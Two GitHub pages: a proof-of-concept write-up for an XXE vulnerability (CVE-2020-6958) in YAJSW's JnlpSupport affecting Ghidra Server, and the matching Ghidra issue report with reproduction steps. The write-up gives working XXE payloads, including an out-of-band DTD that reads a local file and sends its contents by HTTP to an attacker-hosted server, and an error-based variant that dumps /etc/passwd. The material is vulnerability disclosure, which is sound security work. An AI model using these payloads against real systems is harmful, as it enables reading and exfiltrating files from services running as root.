=== Content from github.com_b4920450_20250119_125648.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpurpleracc00n%2FExploits-and-PoC%2Fblob%2Fmaster%2FXXE%2520in%2520YAJSW%25E2%2580%2599s%2520JnlpSupport%2520affects%2520Ghidra%2520Server.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpurpleracc00n%2FExploits-and-PoC%2Fblob%2Fmaster%2FXXE%2520in%2520YAJSW%25E2%2580%2599s%2520JnlpSupport%2520affects%2520Ghidra%2520Server.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=purpleracc00n%2FExploits-and-PoC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[purpleracc00n](/purpleracc00n)
/
**[Exploits-and-PoC](/purpleracc00n/Exploits-and-PoC)**
Public

* [Notifications](/login?return_to=%2Fpurpleracc00n%2FExploits-and-PoC) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fpurpleracc00n%2FExploits-and-PoC)
* [Star
   1](/login?return_to=%2Fpurpleracc00n%2FExploits-and-PoC)

* [Code](/purpleracc00n/Exploits-and-PoC)
* [Issues
  0](/purpleracc00n/Exploits-and-PoC/issues)
* [Pull requests
  0](/purpleracc00n/Exploits-and-PoC/pulls)
* [Actions](/purpleracc00n/Exploits-and-PoC/actions)
* [Projects
  0](/purpleracc00n/Exploits-and-PoC/projects)
* [Security](/purpleracc00n/Exploits-and-PoC/security)
* [Insights](/purpleracc00n/Exploits-and-PoC/pulse)

Additional navigation options

* [Code](/purpleracc00n/Exploits-and-PoC)
* [Issues](/purpleracc00n/Exploits-and-PoC/issues)
* [Pull requests](/purpleracc00n/Exploits-and-PoC/pulls)
* [Actions](/purpleracc00n/Exploits-and-PoC/actions)
* [Projects](/purpleracc00n/Exploits-and-PoC/projects)
* [Security](/purpleracc00n/Exploits-and-PoC/security)
* [Insights](/purpleracc00n/Exploits-and-PoC/pulse)

## Files

 master
## Breadcrumbs

1. [Exploits-and-PoC](/purpleracc00n/Exploits-and-PoC/tree/master)
/
# XXE in YAJSW’s JnlpSupport affects Ghidra Server.md

Copy path Blame  Blame
## Latest commit

## History

[History](/purpleracc00n/Exploits-and-PoC/commits/master/XXE%20in%20YAJSW%E2%80%99s%20JnlpSupport%20affects%20Ghidra%20Server.md)113 lines (76 loc) · 5.06 KB master
## Breadcrumbs

1. [Exploits-and-PoC](/purpleracc00n/Exploits-and-PoC/tree/master)
/
# XXE in YAJSW’s JnlpSupport affects Ghidra Server.md

Top
## File metadata and controls

* Preview
* Code
* Blame

113 lines (76 loc) · 5.06 KB[Raw](https://github.com/purpleracc00n/Exploits-and-PoC/raw/refs/heads/master/XXE%20in%20YAJSW%E2%80%99s%20JnlpSupport%20affects%20Ghidra%20Server.md)

Proof of concept exploit - XXE vulnerability in YAJSW’s JnlpSupport affects Ghidra Server

Currently known as CVE-2020-6958:
<https://nvd.nist.gov/vuln/detail/CVE-2020-6958>

Start by creating an XML file with an XXE payload.

```
exploit_conf.jnlp:

```

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM
"http://127.0.0.1:8000/vulnerable">
]>
<foo>
&xxe;
</foo>
<jnlp spec="9">
</jnlp>

```

This represents a very basic XXE payload which will attempt to connect to the localhost server on port 8000, with a GET request for resource "vulnerable".

To start up the localhost server:

```
$ python -m SimpleHTTPServer

```

Now, modify the “WRAPPER\_CONF” in ghidraSvr script to the path of "exploit\_conf.jnlp":

[![Figure 1 Path of WRAPPER_CONF modified](/purpleracc00n/Exploits-and-PoC/raw/master/Resources/ghidraSvr.png)](/purpleracc00n/Exploits-and-PoC/blob/master/Resources/ghidraSvr.png)

Start ghidraSvr:

```
$ sudo ./ghidraSvr start
```

[![Figure 2: XXE allows HTTP GET requests](/purpleracc00n/Exploits-and-PoC/raw/master/Resources/vulnerable_get.png)](/purpleracc00n/Exploits-and-PoC/blob/master/Resources/vulnerable_get.png)

It is clear that there is an XXE vulnerability present and can also be used to perform SSRF (Server Side Request Forgery) which means tricking the server into making HTTP requests to different resources on the internet this including other XML files. This exploit has proved to be successful against Ghidra version 9.0.4, the latest release at the moment of writing.

File exfiltration is also possible by exploiting this vulnerability. An article from PortSwigger [1] demonstrates how this can be achieved by making the victim include remotely hosted XML files. Adapted to Ghidra, it would mean that the JNLP configuration file (“exploit\_conf.jnlp”) would have the following content:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://127.0.0.1:8000/dtd.xml">
%xxe;
]>
<foo></foo>
```

Meanwhile, the attacker’s file hosted at "<http://127.0.0.1:8000/dtd.xml>" (could be any reachable IP address or domain) will contain:

```
<!ENTITY % file SYSTEM "file:///tmp/testfile.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM ’http://127.0.0.1:8000/?x=%file;’>">
32%eval;
%exfiltrate;

```

The file at "/tmp/testfile.txt" contains the string "FileExfiltrationIsWorking".

With the HTTP server running on localhost port 8000, ghidraSvr is again run and the results
can be seen below:

[![Figure 3: File contents exfiltration](/purpleracc00n/Exploits-and-PoC/raw/master/Resources/file_exfiltration.png)](/purpleracc00n/Exploits-and-PoC/blob/master/Resources/file_exfiltration.png)

The configuration file on the target host is able to make ghidraSvr retrieve data from a different machine, including other XML definitions. This makes possible for attackers to change the payloads remotely, without requiring to trick the victim more than once to change the configuration.

In the example above, the XML document will import the remote definitions which in this case make Ghidra Server load the contents of the "/tmp/testfile.txt" and send them to the same server using an HTTP Get Request. This method of file exfiltration is also called Out-of-Band (OOB) due to the medium it uses to transport data.

What makes this exploit particularly dangerous for Ghidra users is that the ghidraSvr requires administrator (or root) privileges in order to run. This aspect gives the attacker the possibility to retrieve any file on the system, thus completely compromising the confidentiality of the target.

It must be noted that a limitation of this out-of-band approach is the fact that the URL through which data gets exfiltrated might get corrupted with invalid, unsupported characters from the loaded files.

An example is with the "/etc/passwd" file which appears to cause an exception: "java.net.MalformedURLException: Illegal character in URL". This is shown in the output of ghidraSvr prompt and proves the fact that this way of exfiltrating data has a limit.

An alternative for data exfiltration is provided in the same article on PortSwigger [1] and relies on the error outputs in order to redirect the content of the files. It is possible therefore to use externally defined entities (using a remotely hosted file like the "dtd.xml" above) in order to output contents to the console.

For the exploit to work, the following will represent the content of "exploit\_conf.jnlp":

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://127.0.0.1:8000/dtd.xml">
%xxe;
%error;
]>
<foo></foo>
```

Meanwhile, the remotely hosted "dtd.xml" will contain:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM ’file:///nonexistent/%file;’>">
%eval;
```

After executing the exploit in the same way as before, the result shows the content of "/etc/passwd" this suggesting this can be done with any other file as long as the output is in the console. However, this raises another problem as the attacker will need to redirect that console output to an accessible place since it is presumed that the one starting the "ghidraSvr" is a legitimate user. No efficient and unsuspicious way to perform this could be found during the research (but it does not mean there aren’t).

[![Figure 4: File content exfiltration using error based XXE](/purpleracc00n/Exploits-and-PoC/raw/master/Resources/error_xxe.png)](/purpleracc00n/Exploits-and-PoC/blob/master/Resources/error_xxe.png)

Reference: <https://portswigger.net/web-security/xxe/blind>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_261dfb0e_20250119_125648.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNationalSecurityAgency%2Fghidra%2Fissues%2F943)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNationalSecurityAgency%2Fghidra%2Fissues%2F943)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=NationalSecurityAgency%2Fghidra)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NationalSecurityAgency](/NationalSecurityAgency)
/
**[ghidra](/NationalSecurityAgency/ghidra)**
Public

* [Notifications](/login?return_to=%2FNationalSecurityAgency%2Fghidra) You must be signed in to change notification settings
* [Fork
  6k](/login?return_to=%2FNationalSecurityAgency%2Fghidra)
* [Star
   53.2k](/login?return_to=%2FNationalSecurityAgency%2Fghidra)

* [Code](/NationalSecurityAgency/ghidra)
* [Issues
  1.4k](/NationalSecurityAgency/ghidra/issues)
* [Pull requests
  272](/NationalSecurityAgency/ghidra/pulls)
* [Discussions](/NationalSecurityAgency/ghidra/discussions)
* [Actions](/NationalSecurityAgency/ghidra/actions)
* [Wiki](/NationalSecurityAgency/ghidra/wiki)
* [Security](/NationalSecurityAgency/ghidra/security)
* [Insights](/NationalSecurityAgency/ghidra/pulse)

Additional navigation options

* [Code](/NationalSecurityAgency/ghidra)
* [Issues](/NationalSecurityAgency/ghidra/issues)
* [Pull requests](/NationalSecurityAgency/ghidra/pulls)
* [Discussions](/NationalSecurityAgency/ghidra/discussions)
* [Actions](/NationalSecurityAgency/ghidra/actions)
* [Wiki](/NationalSecurityAgency/ghidra/wiki)
* [Security](/NationalSecurityAgency/ghidra/security)
* [Insights](/NationalSecurityAgency/ghidra/pulse)

# XXE Vulnerability in JnlpSupport of YAJSW affects Ghidra Server #943

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[XXE Vulnerability in JnlpSupport of YAJSW affects Ghidra Server](#top)#943Copy linkLabels[Feature: Server](https://github.com/NationalSecurityAgency/ghidra/issues?q=state%3Aopen%20label%3A%22Feature%3A%20Server%22)[Type: Security](https://github.com/NationalSecurityAgency/ghidra/issues?q=state%3Aopen%20label%3A%22Type%3A%20Security%22)![@purpleracc00n](https://avatars.githubusercontent.com/u/47504061?v=4&size=80)
## Description

![@purpleracc00n](https://avatars.githubusercontent.com/u/47504061?v=4&size=48)[purpleracc00n](https://github.com/purpleracc00n)opened [on Aug 27, 2019](https://github.com/NationalSecurityAgency/ghidra/issues/943#issue-485841948)

**Describe the bug**

XXE vulnerability in YAJSW’s JnlpSupport affects Ghidra Server.

An insecure way to parse XML input was found in JnlpSupport class from Yet Another Java Service Wrapper used by Ghidra (up to latest version).

**To Reproduce**

Steps to reproduce the behavior:

1. Create an XXE payload file and set the extension of the file to ".jnlp"
2. Go to <path\_to\_ghidra>/server/ghidraSvr
3. Modify "WRAPPER\_CONF" value to point to the ".jnlp" file
4. Run ghidraSvr using "$ sudo ./ghidraSvr start"
5. XXE exploit in the ".jnlp" file gets executed

**Expected behavior**

Extended XML Entities should be disabled.

**Environment:**

* OS: Kali Linux, Debian 4.19.37-2kali1 (2019-05-15)
* Java Version: 11.0
* Ghidra Version: 9.0.4

**Additional context**

I understand the vulnerable code is actually part of a separate library, however I considered this of interest and I suggest adding a filter so no ".jnlp" configuration files are allowed as values for "WRAPPER\_CONF", at least until YAJSW patches this problem.

More PoC (Available after the fix is confirmed): <https://github.com/purpleracc00n/Exploits-and-PoC/blob/master/XXE%20in%20YAJSW%E2%80%99s%20JnlpSupport%20affects%20Ghidra%20Server.md>

## Metadata

### Assignees

No one assigned

### Labels

[Feature: Server](https://github.com/NationalSecurityAgency/ghidra/issues?q=state%3Aopen%20label%3A%22Feature%3A%20Server%22)[Type: Security](https://github.com/NationalSecurityAgency/ghidra/issues?q=state%3Aopen%20label%3A%22Type%3A%20Security%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


